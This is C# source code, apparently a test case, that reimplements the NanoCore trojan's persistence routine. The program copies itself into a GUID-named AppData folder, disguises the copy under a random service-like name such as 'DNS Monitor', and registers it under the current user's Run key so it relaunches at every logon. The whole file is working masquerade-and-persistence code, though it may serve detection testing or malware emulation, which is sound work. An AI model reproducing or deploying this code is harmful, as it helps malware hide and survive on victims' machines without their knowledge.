//Author: Shaddy43

using Microsoft.Win32;
using System;
using System.IO;
using Microsoft.VisualBasic.CompilerServices;
using System.Security.Cryptography;
using System.Reflection;

namespace NanoCore_testcase7
{
    internal class Program
    {
        static string regpath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        static string regkey = "";
        static string regvalue = "C:\\Program Files (x86)\\";

        static void Main(string[] args)
        {
            string directory = Masquerade();

            Guid guid = Guid.NewGuid();
            string appDataFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            //string guid_cut = guid.ToString().Substring(1, guid.ToString().Length - 2);
            string full_path = appDataFolderPath + "\\" + guid.ToString() + "\\" + directory;

            try
            {
                if (!CheckForRegistry())
                {
                    Directory.CreateDirectory(Path.GetDirectoryName(full_path));
                    if (!CompareHash(full_path))
                    {
                        File.Delete(full_path);
                        File.Copy(Assembly.GetExecutingAssembly().Location, full_path);
                    }

                    RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(regpath, true);
                    registryKey.SetValue(regkey, full_path);
                }
            } catch (Exception e) 
            {
                Console.WriteLine(e);
            }
        }

        public static bool CheckForRegistry()
        {
            try
            {
                RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(regpath, false);
                string a = Conversions.ToString(registryKey.GetValue(regkey, string.Empty));
                return string.Equals(a, regvalue, StringComparison.InvariantCultureIgnoreCase);
            }
            catch (Exception exception_)
            {
                Console.WriteLine(exception_);
            }
            return false;
        }

        public static bool CompareHash(string file)
        {
            if (!File.Exists(file))
            {
                return false;
            }
            FileStream fileStream = null;
            try
            {
                fileStream = File.OpenRead(Assembly.GetExecutingAssembly().Location);
                string left = MD5(fileStream);
                fileStream.Close();
                fileStream = File.OpenRead(file);
                string right = MD5(fileStream);
                fileStream.Close();
                return Operators.CompareString(left, right, false) == 0;
            }
            catch (Exception exception_)
            {
                Console.WriteLine(exception_);
            }
            finally
            {
                if (fileStream != null)
                {
                    fileStream.Close();
                }
            }
            return false;
        }

        public static string MD5(Stream stream_0)
        {
            MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
            return BitConverter.ToString(md5CryptoServiceProvider.ComputeHash(stream_0)).Replace("-", string.Empty);
        }

        public static string Masquerade()
        {
            string[] array1 = { "ss", "mon", "mgr", "sv", "svc", "host" };
            string[] array2 = { "Subsystem", "Monitor", "Manager", "Service", "Service", "Host" };
            string[] array3 = { "dhcp", "upnp", "tcp", "udp", "saas", "ntfs", "dns", "iss", "smtp", "dos", "dpi", "pci", "scsi", "wan", "lan", "nat", "imap", "nas", "wpa", "dsl", "agp", "arp", "ddp" };

            Random random = new Random();

            int rand = random.Next(array1.Length);
            string part1 = array1[rand];
            string part3 = array3[random.Next(array3.Length)];

            string combination = $"{part3}{part1}.exe";
            string combination_final = part3.ToUpper() + " " + array2[rand] + "\\" + combination;
            regkey = part3.ToUpper() + " " + array2[rand];
            regvalue = regvalue + combination_final;

            //Console.WriteLine(combination_final);
            return combination_final;
        }
    }
}
